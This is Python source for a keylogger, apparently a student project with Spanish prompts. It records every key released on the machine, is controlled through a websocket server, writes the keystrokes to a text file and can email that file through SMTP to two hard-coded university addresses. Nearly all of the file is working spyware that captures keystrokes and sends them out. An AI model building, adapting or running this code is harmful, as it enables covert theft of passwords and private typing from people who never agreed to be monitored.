import asyncio
import keyboard
import smtplib
import yagmail
import websockets
from os import remove

registros = []

def callback(event):
    #print(event.name) 
    registros.append(event.name) 

def output(text):
    with open('output.txt', 'w') as f:
        f.write(text)

def send_email(sender_email , receiver_email):
  
    yag = yagmail.SMTP(sender_email)
    yag.send(to=receiver_email, subject='Registros de Keylogger', contents='Se adjunta el archivo de registros', attachments='output.txt')

async def keylogger(websocket, path):
    await websocket.send("---------------------------------")
    await websocket.send("---------- KeyLogger ------------")
    await websocket.send("---------------------------------")
    
    await websocket.send("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_email = await websocket.recv()
    await websocket.send("¿Deseas guardar los registros en texto plano? (yes/no): ")
    respuesta_guardar = await websocket.recv()
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
    	await websocket.send("Interrumpiendo la ejecución del programa...")
    	return
    
    keyboard.on_release(callback)
    
    await websocket.send("Telclea exit en el caso de terminar la ejecución del KeyBoard")
    while True:
        if await websocket.recv() == 'exit':
            await websocket.send("Terminando la ejecución del programa...")
            break
                
    keyboard.unhook_all()
    
    registro = ",".join(registros)
    
    await websocket.send(registro)
    output(registro)
    
    if respuesta_email.lower() in ['yes', 'y']:
    	receivers = ["janet1204@ciencias.unam.mx", "Paola_VB@ciencias.unam.mx"]
    	send_email("janet1204@ciencias.unam.mx", receivers)
        
    if respuesta_guardar.lower() not in ['yes', 'y']:
        remove('output.txt')
        
async def main():
    server = await websockets.serve(keylogger, port=1463)
    await server.wait_closed()


if __name__ == "__main__":
    asyncio.run(main())
